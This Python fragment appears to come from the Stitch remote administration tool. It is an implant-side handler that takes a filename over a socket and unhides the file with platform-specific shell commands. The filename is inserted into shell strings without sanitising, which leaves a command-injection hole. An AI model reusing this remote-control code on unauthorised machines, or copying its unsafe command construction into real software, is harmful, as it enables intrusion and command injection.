# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

f_name = receive(client_socket)
system = sys.platform
if os.path.exists(f_name):
    if win_client():
        resp = run_command(f"attrib -H {f_name}")
    if osx_client():
        resp = run_command(f"chflags nohidden {f_name}")
    if lnx_client():
        resp = (
            run_command(f"mv {f_name} {f_name[1:]}")
            if f_name.startswith('.')
            else '[*] File is already unhidden.\n'
        )

elif lnx_client() and f_name.startswith('.'):
    if os.path.exists(f_name[1:]):
        resp = '[*] File is already unhidden.\n'
else:
    resp = f"[!] {f_name}: No such file or directory\n"
send(client_socket,resp)
